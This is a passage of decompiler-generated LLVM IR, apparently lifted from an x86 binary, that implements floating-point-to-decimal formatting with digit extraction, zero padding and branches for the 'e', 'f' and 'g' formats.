  %v4_80526a6.masked = zext i16 %tmp194 to i32
  %v11_80526ab = or i32 %v10_80526ab, %v4_80526a6.masked
  %v12_80526ab = or i32 %v11_80526ab, %v6_80526a6
  store i32 %v12_80526ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526b3

dec_label_pc_80526b3:                             ; preds = %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge, %dec_label_pc_805268f
  %v2_80526d8 = phi x86_fp80 [ %storemerge, %dec_label_pc_805268f ], [ %v2_80526d8.pre, %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge ]
  %v1_80526b3 = phi i3 [ %v1_805256a, %dec_label_pc_805268f ], [ %v1_80526b3.pre, %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge ]
  %v3_80526da = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805268f ], [ %v0_80526b3.pre, %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8052693, %dec_label_pc_805268f ], [ %v4_80526d3, %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_80526da to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_80526cd = sitofp i32 %tmp195 to x86_fp80
  %v4_80526d3 = add i32 %stack_var_-212.0, 9
  %v4_80526d8 = fsub x86_fp80 %v2_80526d8, %v5_80526cd
  store i3 %v1_80526b3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80526da = fmul x86_fp80 %v3_80526da, %v4_80526d8
  store x86_fp80 %v4_80526da, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80526dc

dec_label_pc_80526dc:                             ; preds = %dec_label_pc_80526dc.dec_label_pc_80526dc_crit_edge, %dec_label_pc_80526b3
  %v0_80526f0 = phi i32 [ %v0_80526f0.pre, %dec_label_pc_80526dc.dec_label_pc_80526dc_crit_edge ], [ %tmp195, %dec_label_pc_80526b3 ]
  %v0_80526e0 = phi i32 [ %v0_80526e0.pre, %dec_label_pc_80526dc.dec_label_pc_80526dc_crit_edge ], [ 0, %dec_label_pc_80526b3 ]
  %v1_80526e0 = add i32 %v0_80526e0, 1
  store i32 %v1_80526e0, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_80526ea = sub i32 %v4_80526d3, %v1_80526e0
  %div = udiv i32 %v0_80526f0, 10
  %tmp185 = urem i32 %v0_80526f0, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_80526f6 = and i32 %div, 536870656
  store i32 %v2_80526ea, i32* %edx.global-to-local, align 4
  %v1_80526fc = trunc i32 %tmp185 to i8
  %v2_80526fc = or i8 %v1_80526fc, 48
  %v12_80526fc = zext i8 %v2_80526fc to i32
  %v15_80526fc = or i32 %v12_80526fc, %v3_80526f6
  store i32 %v15_80526fc, i32* %eax.global-to-local, align 4
  %v3_8052701 = inttoptr i32 %v2_80526ea to i8*
  store i8 %v2_80526fc, i8* %v3_8052701, align 1
  %v7_8052703 = icmp sgt i32 %v1_80526e0, 8
  br i1 %v7_8052703, label %dec_label_pc_8052705, label %dec_label_pc_80526dc.dec_label_pc_80526dc_crit_edge

dec_label_pc_80526dc.dec_label_pc_80526dc_crit_edge: ; preds = %dec_label_pc_80526dc
  %v0_80526e0.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80526f0.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80526dc

dec_label_pc_8052705:                             ; preds = %dec_label_pc_80526dc
  %v0_8052705 = load i32, i32* @edi, align 4
  %v1_8052705 = add i32 %v0_8052705, 1
  store i32 %v1_8052705, i32* @edi, align 4
  %v7_8052709 = icmp sgt i32 %v1_8052705, 2
  br i1 %v7_8052709, label %dec_label_pc_805270b, label %dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge

dec_label_pc_8052705.dec_label_pc_80526b3_crit_edge: ; preds = %dec_label_pc_8052705
  %v0_80526b3.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_80526b3.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80526d8.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80526b3

dec_label_pc_805270b:                             ; preds = %dec_label_pc_8052705
  %v0_805270b = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805270b = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_805270b, x86_fp80* %st0.global-to-local, align 4
  %v2_805270d = add i3 %v0_805270b, 2
  store i3 %v2_805270d, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805270f = add i8 %stack_var_-207.0, -96
  %v6_805270f = sub i8 95, %stack_var_-207.0
  %v7_805270f = and i8 %v6_805270f, %stack_var_-207.0
  %v8_805270f = icmp slt i8 %v7_805270f, 0
  %v9_805270f = icmp eq i8 %v4_805270f, 0
  %v10_805270f = icmp slt i8 %v4_805270f, 0
  %v3_8052714 = icmp eq i1 %v10_805270f, %v8_805270f
  %v4_8052714 = icmp eq i1 %v9_805270f, false
  %v5_8052714 = and i1 %v4_8052714, %v3_8052714
  br i1 %v5_8052714, label %dec_label_pc_8052723, label %dec_label_pc_8052716

dec_label_pc_8052716:                             ; preds = %dec_label_pc_805270b
  %v4_8052716 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8052723

dec_label_pc_8052723:                             ; preds = %dec_label_pc_805270b, %dec_label_pc_8052716
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_805270b ], [ %v4_8052716, %dec_label_pc_8052716 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_805270b ], [ 69, %dec_label_pc_8052716 ]
  %v12_8052723 = icmp eq i8 %stack_var_-207.1, 103
  %v1_8052728 = icmp eq i1 %v12_8052723, false
  br i1 %v1_8052728, label %dec_label_pc_8052731, label %dec_label_pc_805272a

dec_label_pc_805272a:                             ; preds = %dec_label_pc_8052723
  %v0_805272a = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_805272a, 1
  br i1 %tmp186, label %dec_label_pc_8052738, label %dec_label_pc_805272e

dec_label_pc_805272e:                             ; preds = %dec_label_pc_805272a
  %v1_805272e = add i32 %v0_805272a, -1
  store i32 %v1_805272e, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052738

dec_label_pc_8052731:                             ; preds = %dec_label_pc_8052723
  %v12_8052731 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8052731, label %dec_label_pc_805273c, label %dec_label_pc_8052731.dec_label_pc_8052738_crit_edge

dec_label_pc_8052731.dec_label_pc_8052738_crit_edge: ; preds = %dec_label_pc_8052731
  %v0_8052738.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052738

dec_label_pc_8052738:                             ; preds = %dec_label_pc_8052731.dec_label_pc_8052738_crit_edge, %dec_label_pc_805272a, %dec_label_pc_805272e
  %v0_8052738 = phi i32 [ %v0_8052738.pre, %dec_label_pc_8052731.dec_label_pc_8052738_crit_edge ], [ %v0_805272a, %dec_label_pc_805272a ], [ %v1_805272e, %dec_label_pc_805272e ]
  store i32 %v0_8052738, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052769

dec_label_pc_805273c:                             ; preds = %dec_label_pc_8052731
  store i32 %v0_8052749, i32* %eax.global-to-local, align 4
  %v0_8052740 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052740 = add i32 %v0_8052740, %v0_8052749
  store i32 %v2_8052740, i32* %ebx.global-to-local, align 4
  %v5_8052747 = icmp slt i32 %v2_8052740, -1
  br i1 %v5_8052747, label %dec_label_pc_8052749, label %dec_label_pc_8052769

dec_label_pc_8052749:                             ; preds = %dec_label_pc_805273c
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052751 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8052751, i32* %eax.global-to-local, align 4
  %v4_8052759 = bitcast i32* %stack_var_-72 to i8*
  %v5_8052759 = call i32 @__GI_memset(i8* %v4_8052759, i32 48, i32 21)
  store i32 %v5_8052759, i32* %eax.global-to-local, align 4
  %v0_8052769.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052769

dec_label_pc_8052769:                             ; preds = %dec_label_pc_805273c, %dec_label_pc_8052749, %dec_label_pc_8052738
  %v1_8052789 = phi i32 [ %v0_8052738, %dec_label_pc_8052738 ], [ %v2_8052740, %dec_label_pc_805273c ], [ %v0_8052769.pr.pre, %dec_label_pc_8052749 ]
  %stack_var_-220.3 = phi i32 [ %v0_8052749, %dec_label_pc_8052738 ], [ %v0_8052749, %dec_label_pc_805273c ], [ -1, %dec_label_pc_8052749 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_805277c = icmp sgt i32 %v1_8052789, 20
  br i1 %v7_805277c, label %dec_label_pc_805277e, label %dec_label_pc_8052789

dec_label_pc_805277e:                             ; preds = %dec_label_pc_8052769
  %v2_805277e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_805277e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805279d.preheader

dec_label_pc_8052789:                             ; preds = %dec_label_pc_8052769
  %v0_8052789 = load i32, i32* @esp, align 4
  %v2_8052789 = add i32 %v1_8052789, 165
  %v3_8052789 = add i32 %v2_8052789, %v0_8052789
  store i32 %v3_8052789, i32* %eax.global-to-local, align 4
  %v1_8052790 = add i32 %v3_8052789, 2
  %v2_8052790 = inttoptr i32 %v1_8052790 to i8*
  %v3_8052790 = load i8, i8* %v2_8052790, align 1
  %v4_8052790 = add i8 %v3_8052790, -53
  %v9_8052790 = sub i8 52, %v3_8052790
  %v10_8052790 = and i8 %v9_8052790, %v3_8052790
  %v11_8052790 = icmp slt i8 %v10_8052790, 0
  %v13_8052790 = icmp slt i8 %v4_8052790, 0
  store i32 %v1_8052790, i32* %ecx.global-to-local, align 4
  %v2_8052797 = icmp eq i1 %v13_8052790, %v11_8052790
  %v3_8052797 = zext i1 %v2_8052797 to i32
  br label %dec_label_pc_805279d.preheader

dec_label_pc_805279d.preheader:                   ; preds = %dec_label_pc_8052789, %dec_label_pc_805277e
  %v0_805279d102 = phi i32 [ %v1_8052790, %dec_label_pc_8052789 ], [ %v2_805277e, %dec_label_pc_805277e ]
  %storemerge71 = phi i32 [ %v3_8052797, %dec_label_pc_8052789 ], [ 0, %dec_label_pc_805277e ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805279d

dec_label_pc_805279d:                             ; preds = %dec_label_pc_805279d.backedge, %dec_label_pc_805279d.preheader
  %v3_805279e = phi i32 [ %v3_805279e.pre, %dec_label_pc_805279d.backedge ], [ %storemerge71, %dec_label_pc_805279d.preheader ]
  %v0_805279d = phi i32 [ %v0_80527a0, %dec_label_pc_805279d.backedge ], [ %v0_805279d102, %dec_label_pc_805279d.preheader ]
  %v1_805279d = add i32 %v0_805279d, -1
  store i32 %v1_805279d, i32* %ecx.global-to-local, align 4
  %v1_805279e = inttoptr i32 %v1_805279d to i8*
  %v2_805279e = load i8, i8* %v1_805279e, align 1
  %v4_805279e = trunc i32 %v3_805279e to i8
  %v5_805279e = add i8 %v2_805279e, %v4_805279e
  store i8 %v5_805279e, i8* %v1_805279e, align 1
  %v0_80527a0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80527a0 = inttoptr i32 %v0_80527a0 to i8*
  %v2_80527a0 = load i8, i8* %v1_80527a0, align 1
  %v3_80527a0 = zext i8 %v2_80527a0 to i32
  %v4_80527a0 = load i32, i32* %edx.global-to-local, align 4
  %v5_80527a0 = and i32 %v4_80527a0, -256
  %v6_80527a0 = or i32 %v5_80527a0, %v3_80527a0
  store i32 %v6_80527a0, i32* %edx.global-to-local, align 4
  %v7_80527a2 = icmp eq i8 %v2_80527a0, 48
  br i1 %v7_80527a2, label %dec_label_pc_805279d.backedge, label %dec_label_pc_80527a7

dec_label_pc_805279d.backedge:                    ; preds = %dec_label_pc_805279d, %dec_label_pc_80527a7
  %v3_805279e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805279d

dec_label_pc_80527a7:                             ; preds = %dec_label_pc_805279d
  %v2_80527a7 = add i8 %v2_80527a0, -57
  %v7_80527a7 = sub i8 56, %v2_80527a0
  %v8_80527a7 = and i8 %v7_80527a7, %v2_80527a0
  %v9_80527a7 = icmp slt i8 %v8_80527a7, 0
  %v10_80527a7 = icmp eq i8 %v2_80527a7, 0
  %v11_80527a7 = icmp slt i8 %v2_80527a7, 0
  %v3_80527aa = icmp eq i1 %v11_80527a7, %v9_80527a7
  %v4_80527aa = icmp eq i1 %v10_80527a7, false
  %v5_80527aa = and i1 %v4_80527aa, %v3_80527aa
  br i1 %v5_80527aa, label %dec_label_pc_805279d.backedge, label %dec_label_pc_80527ac

dec_label_pc_80527ac:                             ; preds = %dec_label_pc_80527a7
  %v2_80527ac = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_80527ac, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_80527a0, %v2_80527ac
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_80527b7, label %dec_label_pc_80527c4

dec_label_pc_80527b7:                             ; preds = %dec_label_pc_80527ac
  store i32 %v2_8052693, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80527cd

dec_label_pc_80527c4:                             ; preds = %dec_label_pc_80527ac
  store i32 %v2_80527ac, i32* %edx.global-to-local, align 4
  store i32 %v2_80527ac, i32* %ecx.global-to-local, align 4
  %v1_80527cc = add i32 %stack_var_-220.3, 1
  store i32 %v1_80527cc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80527cd

dec_label_pc_80527cd:                             ; preds = %dec_label_pc_80527b7, %dec_label_pc_80527c4
  %v0_80527cd = phi i32 [ %v0_80527a0, %dec_label_pc_80527b7 ], [ %v2_80527ac, %dec_label_pc_80527c4 ]
  %v1_80527cd = add i32 %v0_80527cd, 1
  store i32 %v1_80527cd, i32* %eax.global-to-local, align 4
  %v2_80527d4 = inttoptr i32 %v1_80527cd to i8*
  store i8 0, i8* %v2_80527d4, align 1
  br i1 %v1_8052728, label %dec_label_pc_80527fa, label %dec_label_pc_80527df

dec_label_pc_80527df:                             ; preds = %dec_label_pc_80527cd
  %v0_80527df = load i32, i32* %esi.global-to-local, align 4
  %v5_80527e2 = icmp slt i32 %v0_80527df, -4
  br i1 %v5_80527e2, label %dec_label_pc_8052807, label %dec_label_pc_80527e4

dec_label_pc_80527e4:                             ; preds = %dec_label_pc_80527df
  %v1_80527e4 = load i32, i32* %ebx.global-to-local, align 4
  %v7_80527e6 = icmp slt i32 %v1_80527e4, %v0_80527df
  br i1 %v7_80527e6, label %dec_label_pc_8052807, label %dec_label_pc_80527ef

dec_label_pc_80527ef:                             ; preds = %dec_label_pc_80527e4
  %v2_80527f1 = sub i32 %v1_80527e4, %v0_80527df
  store i32 %v2_80527f1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805280b

dec_label_pc_80527fa:                             ; preds = %dec_label_pc_80527cd
  %v4_80527fa = zext i8 %stack_var_-207.1 to i32
  %v5_80527fa = load i32, i32* %ebx.global-to-local, align 4
  %v6_80527fa = and i32 %v5_80527fa, -256
  %v7_80527fa = or i32 %v6_80527fa, %v4_80527fa
  store i32 %v7_80527fa, i32* %ebx.global-to-local, align 4
  %v10_80527fe = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_80527fe, label %dec_label_pc_80527fa.dec_label_pc_805280b_crit_edge, label %dec_label_pc_8052807

dec_label_pc_80527fa.dec_label_pc_805280b_crit_edge: ; preds = %dec_label_pc_80527fa
  %v0_805280b.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805280b

dec_label_pc_8052807:                             ; preds = %dec_label_pc_80527df, %dec_label_pc_80527e4, %dec_label_pc_80527fa
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80527fa ], [ 103, %dec_label_pc_80527e4 ], [ 103, %dec_label_pc_80527df ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052815

dec_label_pc_805280b:                             ; preds = %dec_label_pc_80527fa.dec_label_pc_805280b_crit_edge, %dec_label_pc_80527ef
  %v0_805280d = phi i32 [ %v0_805280b.pre, %dec_label_pc_80527fa.dec_label_pc_805280b_crit_edge ], [ %v0_80527df, %dec_label_pc_80527ef ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_80527fa.dec_label_pc_805280b_crit_edge ], [ 102, %dec_label_pc_80527ef ]
  %v2_805280b = icmp slt i32 %v0_805280d, 0
  store i32 %v0_805280d, i32* %ebx.global-to-local, align 4
  %v1_805280f = icmp eq i1 %v2_805280b, false
  br i1 %v1_805280f, label %dec_label_pc_8052815, label %dec_label_pc_8052811

dec_label_pc_8052811:                             ; preds = %dec_label_pc_805280b
  %v0_8052811 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052811 = add i32 %v0_8052811, -1
  store i32 %v1_8052811, i32* %edx.global-to-local, align 4
  %v1_8052812 = inttoptr i32 %v1_8052811 to i8*
  store i8 48, i8* %v1_8052812, align 1
  %v0_805284a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052815

dec_label_pc_8052815:                             ; preds = %dec_label_pc_805280b, %dec_label_pc_8052807, %dec_label_pc_8052811
  %v1_80528a5 = phi i32 [ %v0_805280d, %dec_label_pc_805280b ], [ %v0_805284a.pre, %dec_label_pc_8052811 ], [ 0, %dec_label_pc_8052807 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_805280b ], [ %stack_var_-197.1, %dec_label_pc_8052811 ], [ %stack_var_-197.0, %dec_label_pc_8052807 ]
  %v2_8052815 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8052815, i32* %eax.global-to-local, align 4
  %v0_8052824 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052824 = add i32 %v0_8052824, 1
  store i32 %v1_8052824, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8052833 = inttoptr i32 %v0_8052824 to i8*
  %v2_8052833 = load i8, i8* %v1_8052833, align 1
  %v3_8052833 = zext i8 %v2_8052833 to i32
  %v5_8052833 = and i32 %v2_8052815, -256
  %v6_8052833 = or i32 %v3_8052833, %v5_8052833
  store i32 %v6_8052833, i32* %eax.global-to-local, align 4
  store i32 %v6_8052833, i32* %stack_var_-22, align 4
  %v2_8052848 = sub i32 %v1_80527cd, %v1_8052824
  store i32 %v2_8052848, i32* %edx.global-to-local, align 4
  %v1_805284a = icmp eq i32 %v1_80528a5, 0
  %v2_805284a = icmp slt i32 %v1_80528a5, 0
  br i1 %v2_805284a, label %dec_label_pc_8052899, label %dec_label_pc_805284e

dec_label_pc_805284e:                             ; preds = %dec_label_pc_8052815
  %v2_805284e = sub i32 %v1_80528a5, %v2_8052848
  %v8_805284e = xor i32 %v2_8052848, %v1_80528a5
  %v9_805284e = xor i32 %v2_805284e, %v1_80528a5
  %v10_805284e = and i32 %v9_805284e, %v8_805284e
  %v11_805284e = icmp slt i32 %v10_805284e, 0
  %v13_805284e = icmp slt i32 %v2_805284e, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_805285c = icmp eq i1 %v13_805284e, %v11_805284e
  br i1 %v2_805285c, label %dec_label_pc_805285e, label %dec_label_pc_8052892

dec_label_pc_805285e:                             ; preds = %dec_label_pc_805284e
  store i32 %v2_805284e, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_805284e, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8052873, label %dec_label_pc_805288e

dec_label_pc_8052873:                             ; preds = %dec_label_pc_805285e
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_805288e

dec_label_pc_805288e:                             ; preds = %dec_label_pc_805285e, %dec_label_pc_8052873
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8052873 ], [ %stack_var_-132, %dec_label_pc_805285e ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80528ae

dec_label_pc_8052892:                             ; preds = %dec_label_pc_805284e
  %v4_8052894 = icmp eq i1 %v1_805284a, false
  br i1 %v4_8052894, label %dec_label_pc_805289f, label %dec_label_pc_8052896

dec_label_pc_8052896:                             ; preds = %dec_label_pc_8052892
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052899

dec_label_pc_8052899:                             ; preds = %dec_label_pc_8052815, %dec_label_pc_8052896
  %v0_80528e1112 = phi i32 [ %v1_80528a5, %dec_label_pc_8052815 ], [ -1, %dec_label_pc_8052896 ]
  %v2_8052899 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052899, i32* @ecx, align 4
  br label %dec_label_pc_80528ae

dec_label_pc_805289f:                             ; preds = %dec_label_pc_8052892
  %v2_80528a3 = add i32 %v1_8052824, %v1_80528a5
  store i32 %v2_80528a3, i32* %edi.global-to-local, align 4
  %v2_80528a5 = sub i32 %v2_8052848, %v1_80528a5
  store i32 %v2_80528a5, i32* %edx.global-to-local, align 4
  %v2_80528a7 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80528a7, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528ae

dec_label_pc_80528ae:                             ; preds = %dec_label_pc_8052899, %dec_label_pc_805288e, %dec_label_pc_805289f
  %v0_80528e1111 = phi i32 [ %v0_80528e1112, %dec_label_pc_8052899 ], [ -1, %dec_label_pc_805288e ], [ -1, %dec_label_pc_805289f ]
  %v0_80528ca = phi i32 [ %v2_8052899, %dec_label_pc_8052899 ], [ %storemerge28, %dec_label_pc_805288e ], [ %v2_80528a7, %dec_label_pc_805289f ]
  %v0_80528bb = phi i32 [ %v2_8052848, %dec_label_pc_8052899 ], [ 0, %dec_label_pc_805288e ], [ %v2_80528a5, %dec_label_pc_805289f ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_80528b5 = inttoptr i32 %v1_805252b to i8*
  %v3_80528b5 = load i8, i8* %v2_80528b5, align 1
  %v4_80528b5 = and i8 %v3_80528b5, 16
  %v5_80528b5 = icmp eq i8 %v4_80528b5, 0
  %v1_80528b9 = icmp eq i1 %v5_80528b5, false
  br i1 %v1_80528b9, label %dec_label_pc_80528ca, label %dec_label_pc_80528bb

dec_label_pc_80528bb:                             ; preds = %dec_label_pc_80528ae
  %v1_80528bb = icmp eq i32 %v0_80528bb, 0
  %v1_80528bd = icmp eq i1 %v1_80528bb, false
  br i1 %v1_80528bd, label %dec_label_pc_80528ca, label %dec_label_pc_80528bf

dec_label_pc_80528bf:                             ; preds = %dec_label_pc_80528bb
  br i1 %v12_8052723, label %dec_label_pc_80528e1, label %dec_label_pc_80528c6

dec_label_pc_80528c6:                             ; preds = %dec_label_pc_80528bf
  %v0_80528c6 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_80528c6, 1
  br i1 %tmp189, label %dec_label_pc_80528e1, label %dec_label_pc_80528ca

dec_label_pc_80528ca:                             ; preds = %dec_label_pc_80528c6, %dec_label_pc_80528bb, %dec_label_pc_80528ae
  %v1_80528ca = inttoptr i32 %v0_80528ca to i32*
  store i32 112, i32* %v1_80528ca, align 4
  %v0_80528d0 = load i32, i32* @ecx, align 4
  %v1_80528d0 = add i32 %v0_80528d0, 4
  %v2_80528d0 = inttoptr i32 %v1_80528d0 to i32*
  store i32 1, i32* %v2_80528d0, align 4
  %v0_80528d7 = load i32, i32* @ecx, align 4
  %v1_80528d7 = add i32 %v0_80528d7, 8
  %v2_80528d7 = inttoptr i32 %v1_80528d7 to i32*
  store i32 ptrtoint (i32* @global_var_8057960.230 to i32), i32* %v2_80528d7, align 4
  %v0_80528de = load i32, i32* @ecx, align 4
  %v1_80528de = add i32 %v0_80528de, 12
  store i32 %v1_80528de, i32* @ecx, align 4
  %v0_80528e1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528e1

dec_label_pc_80528e1:                             ; preds = %dec_label_pc_80528c6, %dec_label_pc_80528bf, %dec_label_pc_80528ca
  %v0_80528e8 = phi i32 [ %v0_80528ca, %dec_label_pc_80528c6 ], [ %v0_80528ca, %dec_label_pc_80528bf ], [ %v1_80528de, %dec_label_pc_80528ca ]
  %v0_80528e1 = phi i32 [ %v0_80528e1111, %dec_label_pc_80528c6 ], [ %v0_80528e1111, %dec_label_pc_80528bf ], [ %v0_80528e1.pre, %dec_label_pc_80528ca ]
  %v1_80528e1 = add i32 %v0_80528e1, 1
  %v8_80528e1 = icmp eq i32 %v1_80528e1, 0
  store i32 %v1_80528e1, i32* %ebx.global-to-local, align 4
  br i1 %v8_80528e1, label %dec_label_pc_80528fb, label %dec_label_pc_80528e4

dec_label_pc_80528e4:                             ; preds = %dec_label_pc_80528e1
  %v1_80528e6 = sub i32 -1, %v0_80528e1
  store i32 %v1_80528e6, i32* %eax.global-to-local, align 4
  %v1_80528e8 = inttoptr i32 %v0_80528e8 to i32*
  store i32 176, i32* %v1_80528e8, align 4
  %v0_80528ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80528ee = load i32, i32* @ecx, align 4
  %v2_80528ee = add i32 %v1_80528ee, 4
  %v3_80528ee = inttoptr i32 %v2_80528ee to i32*
  store i32 %v0_80528ee, i32* %v3_80528ee, align 4
  %v0_80528f1 = load i32, i32* @ecx, align 4
  %v1_80528f1 = add i32 %v0_80528f1, 8
  %v2_80528f1 = inttoptr i32 %v1_80528f1 to i32*
  store i32 ptrtoint (i32* @global_var_8057953.229 to i32), i32* %v2_80528f1, align 4
  %v0_80528f8 = load i32, i32* @ecx, align 4
  %v1_80528f8 = add i32 %v0_80528f8, 12
  store i32 %v1_80528f8, i32* @ecx, align 4
  br label %dec_label_pc_80528fb

dec_label_pc_80528fb:                             ; preds = %dec_label_pc_80528e1, %dec_label_pc_80528e4
  %v0_80528ff = phi i32 [ %v0_80528e8, %dec_label_pc_80528e1 ], [ %v1_80528f8, %dec_label_pc_80528e4 ]
  %v0_80528fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80528fb = icmp eq i32 %v0_80528fb, 0
  br i1 %v1_80528fb, label %dec_label_pc_805290e, label %dec_label_pc_80528ff

dec_label_pc_80528ff:                             ; preds = %dec_label_pc_80528fb
  %v1_80528ff = inttoptr i32 %v0_80528ff to i32*
  store i32 112, i32* %v1_80528ff, align 4
  %v0_8052905 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052905 = load i32, i32* @ecx, align 4
  %v2_8052905 = add i32 %v1_8052905, 4
  %v3_8052905 = inttoptr i32 %v2_8052905 to i32*
  store i32 %v0_8052905, i32* %v3_8052905, align 4
  %v0_8052908 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052908 = load i32, i32* @ecx, align 4
  %v2_8052908 = add i32 %v1_8052908, 8
  %v3_8052908 = inttoptr i32 %v2_8052908 to i32*
  store i32 %v0_8052908, i32* %v3_8052908, align 4
  %v0_805290b = load i32, i32* @ecx, align 4
  %v1_805290b = add i32 %v0_805290b, 12
  store i32 %v1_805290b, i32* @ecx, align 4
  br label %dec_label_pc_805290e

dec_label_pc_805290e:                             ; preds = %dec_label_pc_80528fb, %dec_label_pc_80528ff
  %v0_805292c = phi i32 [ %v0_80528ff, %dec_label_pc_80528fb ], [ %v1_805290b, %dec_label_pc_80528ff ]
  br i1 %v1_8052728, label %dec_label_pc_8052922, label %dec_label_pc_8052915

dec_label_pc_8052915:                             ; preds = %dec_label_pc_805290e
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_805291c = load i8, i8* %v2_80528b5, align 1
  %v4_805291c = and i8 %v3_805291c, 16
  %v5_805291c = icmp eq i8 %v4_805291c, 0
  br i1 %v5_805291c, label %dec_label_pc_805293f, label %dec_label_pc_8052922

dec_label_pc_8052922:                             ; preds = %dec_label_pc_8052915, %dec_label_pc_805290e
  %v0_8052922 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052924 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052924 = sub i32 %v0_8052922, %v1_8052924
  store i32 %v2_8052924, i32* %eax.global-to-local, align 4
  %v1_8052926 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052926 = sub i32 %v2_8052924, %v1_8052926
  %v8_8052926 = xor i32 %v1_8052926, %v2_8052924
  %v9_8052926 = xor i32 %v2_8052926, %v2_8052924
  %v10_8052926 = and i32 %v9_8052926, %v8_8052926
  %v11_8052926 = icmp slt i32 %v10_8052926, 0
  %v13_8052926 = icmp slt i32 %v2_8052926, 0
  %v2_8052928 = icmp eq i1 %v13_8052926, %v11_8052926
  br i1 %v2_8052928, label %dec_label_pc_805293f, label %dec_label_pc_805292a

dec_label_pc_805292a:                             ; preds = %dec_label_pc_8052922
  %v2_805292a = sub i32 %v1_8052926, %v2_8052924
  store i32 %v2_805292a, i32* %ebp.global-to-local, align 4
  %v1_805292c = inttoptr i32 %v0_805292c to i32*
  store i32 176, i32* %v1_805292c, align 4
